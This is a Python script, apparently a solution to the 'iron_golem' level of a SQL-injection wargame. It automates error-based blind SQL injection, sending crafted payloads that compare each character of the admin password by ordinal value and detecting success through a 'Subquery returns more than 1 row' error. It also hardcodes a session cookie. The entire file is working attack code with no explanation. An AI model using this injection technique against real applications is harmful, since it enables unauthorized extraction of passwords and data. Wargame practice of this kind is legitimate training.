from urllib.parse import unquote
from bs4 import BeautifulSoup
import re
import requests
 
if __name__=="__main__":
 
    for i in range(1, 5):
        for j in range(1, 255) : # 아스키 코드의 범위
            print("tell me : " + str(j))
            query = "' or id = 'admin' and if(ord(substr(pw, "+str(i)+", 1))="+str(j)+", (select 1 union select 2), 1)#"
            params = {"pw": unquote(query)}
            cookies = {"PHPSESSID" : "2jmdje149iheon8es94327lllt"}
            response = requests.get('https://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php', cookies = cookies, params = params)
            html = response.text
            
            find = re.findall("Subquery returns more than 1 row", html)
            if find:
                print(chr(j), end="")
                break
